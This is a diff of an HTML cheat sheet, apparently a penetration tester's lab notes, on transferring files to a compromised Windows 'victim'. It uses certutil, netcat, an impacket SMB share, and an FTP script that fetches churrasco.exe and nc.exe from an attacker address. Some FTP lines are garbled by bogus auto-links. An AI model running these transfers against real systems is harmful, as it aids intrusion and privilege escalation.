@@ -3,13 +3,13 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>transfer file</title>
-</head><body># Server<br/>
+</head><body><b># Server</b><br/>
 <br/>
 python3 -m http.server 80<br/>
 python2 -m SimpleHTTPServer 80<br/>
 <br/>
 <br/>
-# Client<br/>
+<b># Client</b><br/>
 ## Linux<br/>
 wget <br/>
 <br/>
@@ -20,43 +20,45 @@ certutil -urlcache -split -f http://&lt;ip&gt;/nc.exe<br/>
 <br/>
 <br/>
 <br/>
-<span style="font-family: lucida grande"><span style="font-size: 13pt"><div style="text-align: left">On the receiving end running,<br/>
-</div></span></span><b>nc -l -p 1234 &gt; out.file </b><br/>
-<span style="font-family: lucida grande"><span style="font-size: 13pt"><div style="text-align: left">will begin listening on port 1234.<br/>
-</div></span></span><br/>
-<span style="font-family: lucida grande"><span style="font-size: 13pt"><div style="text-align: left">On the sending end running,<br/>
-</div></span></span><b>nc -w 3 [destination] 1234 &lt; out.file </b>&nbsp;<br/>
+<div style="text-align: left"><span style="font-size: 13pt"><span style="font-family: lucida grande">On the receiving end running,<br/>
+</span></span></div><b>nc -l -p 1234 &gt; out.file </b><br/>
+<div style="text-align: left"><span style="font-size: 13pt"><span style="font-family: lucida grande">will begin listening on port 1234.<br/>
+</span></span></div><br/>
+<div style="text-align: left"><span style="font-size: 13pt"><span style="font-family: lucida grande">On the sending end running,<br/>
+</span></span></div><b>nc -w 3 [destination] 1234 &lt; out.file </b>&nbsp;<br/>
 <br/>
 <br/>
-<b>Using SMB</b><br/>
 <br/>
-# receiver<br/>
-mkdir smb<br/>
+<br/>
+<b>Using SMB (Windows victim)</b><br/>
+<br/>
+<b># receiver (kali)<br/>
+</b>mkdir smb<br/>
 cd smb<br/>
 impacket-smbserver share `pwd`<br/>
 <br/>
 <br/>
-# sender<br/>
-<br/>
+<b># sender (windows)<br/>
+</b><br/>
 net use z: \\&lt;receiver ip&gt;\share<br/>
 <br/>
 <br/>
 <br/>
-<b>create smb with python<br/>
-<br/>
-<br/>
+<b>create ftp with python<br/>
 <br/>
 ## kali (attacker)<br/>
-python -m pyftpdlib -p 21<br/>
+</b>python -m pyftpdlib -p 21<b><br/>
+</b><b><br/>
 <br/>
+## victim (windows)<br/>
+</b>C:\&gt;cd wmpub &nbsp;<br/>
 <br/>
-C:\&gt;cd wmpub &nbsp;<br/>
-<br/>
-echo open 10.10.14.7 21&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> USER anonymous &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> anonymous&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bin&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> GET churrasco.exe &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bye&gt;&gt; <a href="http://ftp.txt/">ftp.txt</a>&nbsp; <br/>
-<br/>
-<br/>
-echo open 10.10.14.7 21&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> USER anonymous &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> anonymous&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bin&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> GET nc.exe &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bye&gt;&gt; <a href="http://ftp.txt/">ftp.txt</a>&nbsp; <br/>
-<br/>
-</b><b>C:\wmpub&gt;ftp -v -n -s:ftp.txt</b>&nbsp; &nbsp;<br/>
+echo open 10.10.14.13 21&gt;&gt;ftp.txt&amp;echo USER anonymous&gt;&gt;ftp.txt&amp;echo anonymous&gt;&gt;ftp.txt&amp;echo bin&gt;&gt;ftp.txt&amp;echo GET churrasco.exe&gt;&gt;ftp.txt&amp;echo bye&gt;&gt;ftp.txt &nbsp;<br/>
+<b><br/>
+</b>echo open 10.10.14.13 21&gt;&gt;ftp.txt&amp;echo USER anonymous&gt;&gt;ftp.txt&amp;echo anonymous&gt;&gt;ftp.txt&amp;echo bin&gt;&gt;ftp.txt&amp;echo GET nc.exe&gt;&gt;ftp.txt&amp;echo bye&gt;&gt;ftp.txt<b><br/>
+</b><b><br/>
+</b>echo open 10.10.14.13 21&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> USER anonymous &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> anonymous&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bin&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> GET nc.exe &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bye&gt;&gt; <a href="http://ftp.txt/">ftp.txt</a>&nbsp; <b><br/>
+</b><b><br/>
+</b>C:\wmpub&gt;<b>&nbsp;ftp -v -n -s:ftp.txt</b>&nbsp; &nbsp;<br/>
 <br/>
 </body></html>
